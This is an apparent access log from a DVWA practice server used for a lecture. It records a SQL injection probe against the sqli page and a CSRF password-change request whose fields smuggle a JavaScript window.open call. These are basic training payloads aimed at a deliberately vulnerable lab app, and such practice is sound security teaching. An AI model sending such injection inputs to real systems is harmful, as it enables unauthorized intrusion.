211.219.10.253 - - [08/Jul/2024:07:49:11 +0000] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 200 626 "http://lecture.devsmile.com:9090/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:49:28 +0000] "GET /vulnerabilities/sqli/?id=+select+*+from+dual&Submit=Submit HTTP/1.1" 200 1772 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:50:19 +0000] "-" 408 0 "-" "-"
211.219.10.253 - - [08/Jul/2024:07:55:25 +0000] "GET /vulnerabilities/csrf/?password_new=password%26%26window.open%28%27https%3A%2F%2Fwww.naver.com%27%29%3B&password_conf=password%26%26window.open%28%27https%3A%2F%2Fwww.naver.com%27%29%3B&Change=Change HTTP/1.1" 200 1764 "http://lecture.devsmile.com:9090/vulnerabilities/csrf/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:55:33 +0000] "GET / HTTP/1.1" 200 3011 "http://lecture.devsmile.com:9090/vulnerabilities/csrf/?password_new=password%26%26window.open%28%27https%3A%2F%2Fwww.naver.com%27%29%3B&password_conf=password%26%26window.open%28%27https%3A%2F%2Fwww.naver.com%27%29%3B&Change=Change" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:55:35 +0000] "GET /vulnerabilities/csrf/ HTTP/1.1" 200 1751 "http://lecture.devsmile.com:9090/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:55:55 +0000] "GET /vulnerabilities/csrf/ HTTP/1.1" 200 1752 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
